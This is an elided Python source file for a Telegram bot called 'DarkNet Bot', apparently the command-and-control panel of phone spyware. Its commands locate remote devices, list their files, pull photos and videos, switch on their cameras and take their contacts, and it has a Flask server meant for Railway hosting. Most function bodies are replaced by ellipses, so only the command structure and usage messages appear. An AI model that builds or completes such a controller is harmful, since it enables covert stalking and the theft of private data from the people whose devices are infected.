...
def start(message):
    ...
    bot.reply_to(message, "🚀 DarkNet Bot Active!\nCommands:\n/locate <id>\n/devices\n/files <id>\n/getphoto <id> <filename>\n/getvideo <id> <filename>\n/camera <id> [front|back]\n/ping <id>\n/stats\n/contacts <id>")
...
def locate(message):
    ...
    try:
        ...
        bot.reply_to(message, f"📍 Locate sent to {device_id}")
    except: bot.reply_to(message, "Usage: /locate <id>")
...
def files(message):
    ...
    try:
        ...
        bot.reply_to(message, f"📁 Files sent to {device_id}")
    except: bot.reply_to(message, "Usage: /files <id>")
...
def getphoto(message):
    ...
    try:
        ...
        bot.reply_to(message, f"🖼️ Photo requested from {device_id}")
    except: bot.reply_to(message, "Usage: /getphoto <id> <filename>")
...
def camera(message):
    ...
    except: bot.reply_to(message, "Usage: /camera <id> [front|back]")
...
def ping(message):
    ...
    except: bot.reply_to(message, "Usage: /ping <id>")
...
def contacts(message):
    ...
    try:
        ...
        bot.reply_to(message, f"📇 Contacts requested from {device_id}")
    except: bot.reply_to(message, "Usage: /contacts <id>")
...
# ===== START SERVER (PYTHON SCRIPT RUNS THIS) =====
if __name__ == "__main__":
    ...
    # Flask built-in server (Railway se PORT milega)
